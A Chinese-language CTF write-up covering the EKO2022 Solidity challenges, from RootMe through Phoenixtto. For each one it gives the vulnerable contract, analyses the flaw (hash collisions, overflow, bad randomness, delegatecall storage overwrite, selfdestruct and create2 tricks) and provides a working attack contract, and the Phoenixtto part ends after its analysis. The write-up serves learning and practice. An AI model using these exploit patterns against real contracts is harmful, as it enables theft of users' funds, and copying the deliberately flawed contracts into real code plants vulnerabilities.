public &#123; require(usernames[username] == false, &quot;Username already exists&quot;); usernames[username] = true; bytes32 identifier = _getIdentifier(username, salt); accountByIdentifier[identifier] = msg.sender; &#125; function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123; return keccak256(abi.encodePacked(user, salt)); &#125; /** * @notice Allows root account to perform any change in the contract&#x27;s storage * @param storageSlot storage position where data will be written * @param data data to be written */ function write(bytes32 storageSlot, bytes32 data) external onlyRoot &#123; assembly &#123; // stores `data` in storage at position `storageSlot` sstore(storageSlot, data) &#125; &#125;&#125; 2. analysis 漏洞所在： 123function _getIdentifier(string memory user, string memory salt) private pure returns (bytes32) &#123; return keccak256(abi.encodePacked(user, salt));&#125; abi.encodePacked(user, salt)，该打包方式，省略了变量的存储位置，变量值的长度，只有变量真正的数据部分，而且还将这两个值拼接在一起，导致abi.encodePacked(“ROOT”, “ROOT”)和abi.encodePacked(“ROO”, “TROOT”)的值是一样的。 3. solve攻击合约 1234567891011121314contract RootMeHacker &#123; RootMe rm; constructor (address _rm) &#123; rm = RootMe(_rm); &#125; function attack() public &#123; rm.register(&quot;ROO&quot;, &quot;TROOT&quot;); // hacker 成为 ROOT rm.write(bytes32(uint(0)), bytes32(uint(1))); // 将变量victory改成true require(rm.victory() == true, &quot;you are not victory..&quot;); &#125;&#125; Trickster1.question We might have spotted a honeypot… Can you manage to obtain the real jackpot?.Hacking casino slot machines is considered illegal. 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title Trickster/// @author https://twitter.com/mattaereal/// @notice We might have spotted a honeypot... Anon, can you manage to obtain the real jackpot?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/trickstercontract Jackpot &#123; address private jackpotProxy; address private owner; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function initialize(address _jackpotProxy) public payable &#123; jackpotProxy = _jackpotProxy; &#125; modifier onlyJackpotProxy() &#123; require(msg.sender == jackpotProxy); _; &#125; function claimPrize(uint256 amount) external payable onlyJackpotProxy &#123; payable(msg.sender).transfer(amount * 2); &#125; fallback() external payable &#123;&#125; receive() external payable &#123;&#125;&#125;contract JackpotProxy &#123; address private owner; address private jackpot; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; constructor() payable &#123; owner = msg.sender; address _proxy = address(new Jackpot()); initialize(_proxy); payable(_proxy).transfer(address(this).balance); &#125; function initialize(address _jackpot) public onlyOwner &#123; jackpot = _jackpot; &#125; function claimPrize() external payable &#123; require(msg.value &gt; 0, &quot;zero deposit&quot;); (bool success,) = jackpot.call&#123;value: msg.value&#125;(abi.encodeWithSignature(&quot;claimPrize(uint)&quot;, msg.value)); require(success, &quot;failed&quot;); payable(msg.sender).transfer(address(this).balance); &#125; function balance() external view returns (uint256) &#123; return jackpot.balance; &#125; receive() external payable &#123;&#125;&#125; 2. analysis 何为蜜罐，吞钱，骗局，JackpotProxy中的claimPrize()就是一个骗局，仔细看。 成功调用JackPot中的claimPrize()函数，该合约中的initialize()任何人都可以调用，所以任何人都可以成为jackpotProxy，任何人都可以调用claimPrize函数，问题转为获取address private jackpot，在区块链中数据都是公开透明的，可以采用hardhat来帮助读取该值。 3. solve攻击合约 1234567891011121314151617181920212223242526contract JackPotHacker &#123; Jackpot jackpot; JackpotProxy jackpotProxy; address owner; constructor(address payable _jackpot, address payable _jackpotProxy) &#123; jackpot = Jackpot(_jackpot); jackpotProxy = JackpotProxy(_jackpotProxy); owner = msg.sender; &#125; function attack() public &#123; jackpot.initialize(address(this)); uint half_balance = jackpotProxy.balance() / 2; jackpot.claimPrize(half_balance); require(jackpotProxy.balance() == 0, &quot;&quot;); returnMoney(); &#125; function returnMoney() internal &#123; payable(owner).call&#123;value: address(this).balance&#125;(&quot;&quot;); &#125; receive() external payable &#123;&#125;&#125; 使用hardhat 12345678910111213141516171819202122232425262728293031323334const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);describe(&quot;[CTFProtocol-2022] Trickster&quot;, function() &#123; let deployer, player; let jackpotproxy, jackpot; before(async function() &#123; [deployer, player] = await ethers.getSigners(); // deploy the contract with 2 wei let contract_factory = await (await ethers.getContractFactory(&#x27;JackpotProxy&#x27;)).deploy(&#123;value: 2&#125;); console.log(`jackpotproxy = $&#123;jackpotproxy = contract_factory.target&#125;`); // get private&#x27;value =&gt; jackpot let slot1 = await ethers.provider.getStorage(contract_factory.target, 1); jackpot = slot1 = `0x$&#123;slot1.slice(slot1.length-40, slot1.length)&#125;`; console.log(`jackpot = $&#123;jackpot&#125; `); &#125;); it(&quot;Execution&quot;, async function() &#123; let hacker = await (await ethers.getContractFactory(&#x27;JackPotHacker&#x27;)).deploy(jackpot, jackpotproxy); await hacker.attack(); &#125;); after(async function() &#123; &#125;);&#125;); The Golden Ticket1.question The organizers of Ekoparty decided that the tickets for the 2023 conference would be purchased through a smart contract. However, the conference is oversold and you have to sign up for a waitlist to get your ticket. The problem is that they put you on hold for ten years and the only option you have is to extend the wait. After the wait is over, you have to enter a raffle to see if you get the ticket 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title The Golden Ticket/// @author https://twitter.com/AlanRacciatti/// @notice Mint your ticket to the EKOparty, if you are patient and lucky enough./// @custom:url https://www.ctfprotocol.com/tracks/eko2022/the-golden-ticketcontract GoldenTicket &#123; mapping(address =&gt; uint40) public waitlist; mapping(address =&gt; bool) public hasTicket; function joinWaitlist() external &#123; require(waitlist[msg.sender] == 0, &quot;Already on waitlist&quot;); unchecked &#123; ///@dev 10 years wait list waitlist[msg.sender] = uint40(block.timestamp + 10 * 365 days); &#125; &#125; function updateWaitTime(uint256 _time) external &#123; require(waitlist[msg.sender] != 0, &quot;Join waitlist first&quot;); unchecked &#123; waitlist[msg.sender] += uint40(_time); &#125; &#125; function joinRaffle(uint256 _guess) external &#123; require(waitlist[msg.sender] != 0, &quot;Not in waitlist&quot;); require(waitlist[msg.sender] &lt;= block.timestamp, &quot;Still have to wait&quot;); require(!hasTicket[msg.sender], &quot;Already have a ticket&quot;); uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); if (randomNumber == _guess) &#123; hasTicket[msg.sender] = true; &#125; delete waitlist[msg.sender]; &#125; function giftTicket(address _to) external &#123; require(hasTicket[msg.sender], &quot;Yoy dont own a ticket&quot;); hasTicket[msg.sender] = false; hasTicket[_to] = true; &#125;&#125; 2. analysis 本题漏洞：坏随机数，整数溢出 即使在 ^0.8.0的编译器中，使用了unchecked&#123;&#125;关键字，即放弃了整数溢出的检测，这便有了溢出的风险， 而updateWaitTime(uint256 _time)函数就是导致整数溢出的关键函数，只要稍加计算便可以算出溢出条件，这里需要注意的是，溢出的结果不能为0，可以是[1, block.timestamp]之间的任何数。 至于坏随机数，可在同一个函数中提前计算。 3. solve攻击合约 1234567891011121314151617181920212223contract GoldenTicketHacker &#123; GoldenTicket goldenticket; constructor(address _goldenticket) &#123; goldenticket = GoldenTicket(_goldenticket); &#125; function attack() public &#123; goldenticket.joinWaitlist(); goldenticket.updateWaitTime(calFlow()); uint256 guess = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); goldenticket.joinRaffle(guess); &#125; function calFlow() internal view returns(uint256) &#123; uint max_uint40 = type(uint40).max; uint40 wait_time = uint40(block.timestamp + 10 * 365 days); uint res = uint40(max_uint40 - wait_time); return res + 2; // 实现上溢,使得waitlist[msg.sender] = 1 &#125;&#125; Smart Horrocrux1.question Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it? 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495// SPDX-License-Identifier: MITpragma solidity 0.8.17;/// @title SmartHorrocrux/// @author https://twitter.com/AugustitoQ/// @notice Some security researchers have recently found an eighth Horrocrux, it seems that Voldemort has link to a smart contract, can you destroy it?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/smart-horrocruxcontract SmartHorrocrux &#123; bool private invincible; bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000; // var only for test purposes bool public alive = true; constructor() payable &#123; require(msg.value == 2, &quot;Pay Horrorcrux creation price&quot;); setInvincible(); &#125; function destroyIt(string memory spell, uint256 magic) public &#123; bytes32 spellInBytes; assembly &#123; spellInBytes := mload(add(spell, 32)) &#125; require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;); require(!invincible, &quot;The Horrocrux is still invincible&quot;); bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic))); address(this).call(kedavra); &#125; function kill() external &#123; require(msg.sender == address(this), &quot;No one can kill me&quot;); alive = false; selfdestruct(payable(tx.origin)); &#125; function setInvincible() public &#123; invincible = (address(this).balance == 1) ? false : true; &#125; fallback() external &#123; uint256 b = address(this).balance; invincible = true; if (b &gt; 0) &#123; tx.origin.call&#123;value: b&#125;(&quot;&quot;); &#125; &#125;&#125;/*░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░▒▒░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░░░░░░░░░░░█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓░░░░░░░░░░░░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░▒██▓▓▒░▓████░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒█▓█▒░▓░▓▓▓▓░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓░░░░▒░▓█▒░░▒▒░░▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓█▓███░░░░░░░▓████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓█░▒█▓░░░░░░░▒█▒░▒█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓▓▒▒███▓▓▓███░▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░▓██▓███▓▓▓▒░░▓██▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓█▒▒▓▓███▓▓▒░░▒▒▓██▒▓▒░▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▒█░▓██▓█▓▒░░▓████▓▒▓░▒██▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓▒▒▒▓▓░░░▓▓░▓▒░▓░░▓██░░█▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░░░▒░█░░░░▒▒▒▒░▓▒░░░▒█░▓░▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░▒▒▓░░░░░▓█░░▓▓░░░░▓▒▒░▒░▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓▒░▓▓█░░░░░░█▓▓░▓░░░▒░▒▒▓░░▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█░░▓█▓░░░░░░█░░▓▓▒▒░▒█▓░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓░░░░░█▓▓▒▒░▒█▓▓▒▒▓▓▒░░░▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓█▓▓▒▒░░▓███████▒▒▒▒▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒███▓▓█▒░▒█████▓▒▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓█▒▒░░▒█████▓▓██▒▒▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▒░░░▓▓███░▒█░░██▓▒▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█░░░░▓░░░██▒▓▒█░░███▓▒▒█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓░░░░▒▒░░░▒▓█▒▓█░░█▒▒█▒▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒░░░▒▓░░░░█▓▓▓▒▒█▒░░▓██▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓░░░░▒▓▒▒▒█▓▒▒▓█▒░░░▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░▒██▓░▓██░░▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▒▒██▓▓░███▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒▓▒▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▒░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓░▓█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒░░▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒▓▒░▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▓▒▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓▒▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓▓░▓▓░░░░░░▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓░▓▓░▒░░░▒▒█▓█▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓▒▒▓░░▒▒▒████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▓░▒▓░░▒░▒▓▓██▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█▒░▒▓░░▒░░░░▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▓░▒▓░░▓▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▒▒▒▒▓▒░░░▒█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒░░░░░░▒▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░*/ 2. analysis 目标是成功执行kill()函数，而要想调用此函数只能通过destroyIt(string memory spell)函数，分析destroyIt()函数 1234567891011function destroyIt(string memory spell, uint256 magic) public &#123; bytes32 spellInBytes; assembly &#123; spellInBytes := mload(add(spell, 32)) &#125; require(spellInBytes == _spell, &quot;That spell wouldn&#x27;t kill a fly&quot;); require(!invincible, &quot;The Horrocrux is still invincible&quot;); bytes memory kedavra = abi.encodePacked(bytes4(bytes32(uint256(spellInBytes) - magic))); address(this).call(kedavra); &#125; 有两个断言： 断言一：形参spell的值等于0x45746865724b6164616272610000000000000000000000000000000000000000，这个可以做到，因为这个值可以由 ASCII码表 转化过来，转化结果如下： 12//45 74 68 65 72 48 61 64 61 62 72 61 0000000000000000000000000000000000000000//EtherKadabra 断言二：调用 setInvincible()，将invincible修改为false。而合约中有 2wei，所以只能通过触发fallback函数，再通过selfdestruct强制给合约发送 1wei，且不会触发回调函数fallback。 使的kedava的值等于kill.selector，可以通过简单的计算得到： 1234function cal() internal pure returns (uint magic) &#123; uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;)))); magic = uint(_spell) - kill_selector;&#125; *这里有个小陷阱，就是需要将byte4转化一次byte32，只有这样bytes4(abi.encodeWithSignature(&quot;kill()&quot;))才会占高位，如下所示 3. solve攻击合约 123456789101112131415161718192021222324252627282930contract SmartHorrocruxHacker &#123; SmartHorrocrux samrthorrocrux; bytes32 private constant _spell = 0x45746865724b6164616272610000000000000000000000000000000000000000; constructor(address _samrthorrocrux) &#123; samrthorrocrux = SmartHorrocrux(_samrthorrocrux); &#125; function attack() public payable &#123; address(samrthorrocrux).call(&quot;&quot;); // tigger fallback() new Helper().kill&#123;value:1&#125;(payable(address(samrthorrocrux))); samrthorrocrux.setInvincible(); // lead to invincible = false samrthorrocrux.destroyIt(&quot;EtherKadabra&quot;, cal()); require(!samrthorrocrux.alive(), &quot;It isn&#x27;t dead...&quot;); &#125; function cal() internal pure returns (uint magic) &#123; uint kill_selector = uint(bytes32(bytes4(abi.encodeWithSignature(&quot;kill()&quot;)))); magic = uint(_spell) - kill_selector; &#125;&#125;contract Helper &#123; function kill(address payable to) public payable &#123; require(msg.value == 1 wei); selfdestruct(to); &#125;&#125; Gas Valve1.question The evil Dr. N. Gas has put into orbit a machine that can suck all the air out of the atmosphere. You sneaked into his spaceship and must find a nozzle to open the main valve and stop the machine! Assert the situation and don’t panic. Hint: on the valve is marked “model no. EIP-150” 源码 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity 0.8.17;interface INozzle &#123; function insert() external returns (bool);&#125;/// @title Gas Valve/// @author https://twitter.com/bahurum/// @notice The evil Dr. N. Gas has created a machine to suck all the air out of the atmosphere. Anon, you must deactivate it before it&#x27;s too late!/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/gas-valvecontract Valve &#123; bool public open; bool public lastResult; function useNozzle(INozzle nozzle) public returns (bool) &#123; try nozzle.insert() returns (bool result) &#123; lastResult = result; return result; &#125; catch &#123; lastResult = false; return false; &#125; &#125; function openValve(INozzle nozzle) external &#123; open = true; (bool success,) = address(this).call(abi.encodeWithSelector(this.useNozzle.selector, nozzle)); require(!success); &#125;&#125; 2. analysis 这题要求成功调用openValve(INozzle nozzle)函数，成功调用的前提是调用useNozzle(INozzle nozzle)失败，而在useNozzle(INozzle nozzle)函数中有try...catch处理语句，用来处理nozzle.insert()。尝试了一下，可以处理require, revert等 看题解才知道，使用selfdestrct()可以使得函数调用失败，但是该失败不会被try catch捕获。 3. solve攻击合约 123456789101112131415161718contract GasValueHacker is INozzle &#123; Valve value; constructor(address _value) &#123; value = Valve(_value); &#125; function attack() public &#123; value.openValve(INozzle(address(this))); require(value.open(), &quot;you are not open...&quot;); &#125; function insert() external returns (bool) &#123; selfdestruct(payable(address(this))); &#125;&#125; Stonks1.question You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money. 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title Stonks/// @author https://twitter.com/eugenioclrc/// @notice You have infiltrated in a big investment firm (name says something about arrows), your task is to loose all their money/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/stonkscontract Stonks &#123; mapping(address =&gt; mapping(uint256 =&gt; uint256)) private _balances; // stock tickers uint256 public constant TSLA = 0; uint256 public constant GME = 1; ///@dev price oracle 1 TSLA stonk is 50 GME stonks uint256 public constant ORACLE_TSLA_GME = 50; constructor(address _player) &#123; ///@dev the trader starts with 200 TSLA shares &amp; 1000 GME shares _balances[_player][TSLA] = 20; _balances[_player][GME] = 1_000; &#125; /// @notice Buy TSLA stonks using GME stonks /// @param amountGMEin amount of GME to spend /// @param amountTSLAout amount of TSLA to buy function buyTSLA(uint256 amountGMEin, uint256 amountTSLAout) external &#123; require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;); _balances[msg.sender][GME] -= amountGMEin; _balances[msg.sender][TSLA] += amountTSLAout; &#125; /// @notice Sell TSLA stonks for GME stonks /// @param amountTSLAin amount of GME to spend /// @param amountGMEout amount of TSLA to buy function sellTSLA(uint256 amountTSLAin, uint256 amountGMEout) external &#123; require(amountTSLAin * ORACLE_TSLA_GME == amountGMEout, &quot;Invalid price&quot;); _balances[msg.sender][TSLA] -= amountTSLAin; _balances[msg.sender][GME] += amountGMEout; &#125; function balanceOf(address _owner, uint256 _ticker) external view returns (uint256) &#123; return _balances[_owner][_ticker]; &#125;&#125; 2. analysis 只要知道在solidity中没有四舍五入，小数点都是采用直接抹除即向下取整的方式处理小数的，这道题就很好解，利用好require(amountGMEin / ORACLE_TSLA_GME == amountTSLAout, &quot;Invalid price&quot;);中的除法运算即可。40 &#x2F; 50 &#x3D; 0 3. solve攻击合约 攻击逻辑：先部署hacker，将hacker设置为player，将stonks地址传入hacker的attack函数中，然后调用该函数即可完成攻击。 12345678910111213141516contract StonksHacker &#123; Stonks stonks; function attack(address _stonks) public &#123; stonks = Stonks(_stonks); stonks.sellTSLA(20, 1000); // let TSLA swap GAM for (uint i; i &lt; 2000 / 40; i++) &#123; stonks.buyTSLA(40, 0); &#125; require(stonks.balanceOf(address(this), 0) == 0, &quot;TSLA is not zero&quot;); require(stonks.balanceOf(address(this), 1) == 0, &quot;GAM is not zero&quot;); &#125;&#125; Pelusa1.question You just open your eyes and are in Mexico 1986, help Diego to set the score from 1 to 2 goals for a win, do whatever is necessary! 源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// SPDX-License-Identifier: MITpragma solidity ^0.8.7;interface IGame &#123; function getBallPossesion() external view returns (address);&#125;// &quot;el baile de la gambeta&quot;// https://www.youtube.com/watch?v=qzxn85zX2aE/// @title Pelusa/// @author https://twitter.com/eugenioclrc/// @notice Its 1986, you are in the football world cup (Mexico86), help Diego score a goal./// @custom:url https://www.ctfprotocol.com/tracks/eko2022/pelusacontract Pelusa &#123; address private immutable owner; address internal player; uint256 public goals = 1; constructor() &#123; owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number)))))); &#125; function passTheBall() external &#123; require(msg.sender.code.length == 0, &quot;Only EOA players&quot;); /// @dev &quot;la pelota siempre al 10&quot; require(uint256(uint160(msg.sender)) % 100 == 10, &quot;not allowed&quot;); player = msg.sender; &#125; function isGoal() public view returns (bool) &#123; // expect ball in owners posession return IGame(player).getBallPossesion() == owner; &#125; function shoot() external &#123; require(isGoal(), &quot;missed&quot;); /// @dev use &quot;the hand of god&quot; trick (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;)); require(success, &quot;missed&quot;); require(uint256(bytes32(data)) == 22_06_1986); &#125;&#125; 2. analysis 目标是将goals的值修改为2，唯一的办法就只能通过delegatecall进行内存覆盖来实现，不过要注意的是immutable修饰的变量不占slot，所以goals在合约中的位置是slot1。 分析shoot() 123456789101112function shoot() external &#123; require(isGoal(), &quot;missed&quot;); // getStorage() /// @dev use &quot;the hand of god&quot; trick (bool success, bytes memory data) = player.delegatecall(abi.encodeWithSignature(&quot;handOfGod()&quot;)); require(success, &quot;missed&quot;); require(uint256(bytes32(data)) == 22_06_1986);&#125;function isGoal() public view returns (bool) &#123; // expect ball in owners posession return IGame(player).getBallPossesion() == owner;&#125; owner：该值可以通过合约地址，找到当时的部署者也就是msg.sender，由于blockhash(block.number)&#x3D; 0，所以 owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0))))))) handOfGod()：自定义该函数，令其返回值为22_06_1986 此外还得通过passTheBall()将player设置为hacker，当然，通过create2可以轻松通过限制条件。 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435contract PelusaHacker is IGame &#123; address private owner; uint256 public goals = 1; // slo Pelusa pelusa; constructor(address _pelusa) &#123; pelusa = Pelusa(_pelusa); pelusa.passTheBall(); // CREATE2 &#125; function attack(address deployer) public &#123; owner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, bytes32(uint(0))))))); pelusa.shoot(); &#125; function handOfGod() public returns(uint) &#123; goals = 2; return 22_06_1986; &#125; function getBallPossesion() external view returns (address) &#123; return owner; &#125;&#125;contract Deployer &#123; function deploy(uint salt, address pelusa) public returns(address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); return address(new PelusaHacker&#123;salt: _salt&#125;(pelusa)); &#125;&#125; Phoenixtto1.question Within the world of crossovers there is a special one, where the universes of pokemon, harry potter and solidity intertwine. In this crossover a mixed creature is created between dumbledore’s phoenix, a wild ditto and since we are in the solidity universe this creature is a contract. We have called it Phoenixtto and it has two important abilities, that of being reborn from it’s ashes after its destruction and that of copying the behavior of another bytecode.Try to capture the Phoenixtto, if you can… 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity 0.8.17;/** * @title Phoenixtto * @author Rotcivegaf https://twitter.com/victor93389091 &lt;victorfage@gmail.com&gt; * @dev Within the world of crossovers there is a special one, where the universes of pokemon, * harry potter and solidity intertwine. * In this crossover a mix creature is created between dumbledore&#x27;s phoenix, a wild ditto and * since we are in the solidity universe this creature is a contract. * We have called it Phoenixtto and it has two important abilities, that of being reborn from * it&#x27;s ashes after its destruction and that of copying the behavior of another bytecode * Try to capture the Phoenixtto, if you can... * @custom:url https://www.ctfprotocol.com/tracks/eko2022/phoenixtto */contract Laboratory &#123; address immutable PLAYER; address public getImplementation; address public addr; constructor(address _player) &#123; PLAYER = _player; &#125; function mergePhoenixDitto() public &#123; reBorn(type(Phoenixtto).creationCode); &#125; function reBorn(bytes memory _code) public &#123; address x; assembly &#123; x := create(0, add(0x20, _code), mload(_code)) &#125; getImplementation = x; _code = hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;; assembly &#123; x := create2(0, add(_code, 0x20), mload(_code), 0) &#125; addr = x; Phoenixtto(x).reBorn(); &#125; function isCaught() external view returns (bool) &#123; return Phoenixtto(addr).owner() == PLAYER; &#125;&#125;contract Phoenixtto &#123; address public owner; bool private _isBorn; function reBorn() external &#123; if (_isBorn) return; _isBorn = true; owner = address(this); &#125; function capture(string memory _newOwner) external &#123; if (!_isBorn || msg.sender != tx.origin) return; address newOwner = address(uint160(uint256(keccak256(abi.encodePacked(_newOwner))))); if (newOwner == msg.sender) &#123; owner = newOwner; &#125; else &#123; selfdestruct(payable(msg.sender)); _isBorn = false; &#125; &#125;&#125; 2. analysis 我认为最主要是考察hex&quot;5860208158601c335a63aaf10f428752fa158151803b80938091923cf3&quot;，利用getImplementation的运行代码，执行create2指令，最后获取一个地址，该地址和第一次调用reBorn()时生成的addr是相同的，期间无论如何修改形参_code的值，addr的值都是同一个，但是重点来了，此时部署出来的addr的合约功能取决于形参_code，这意味着地址还是那个地址，但是内部的代码却大变样了，这个真的很离谱，第一次接触的我大为震惊。 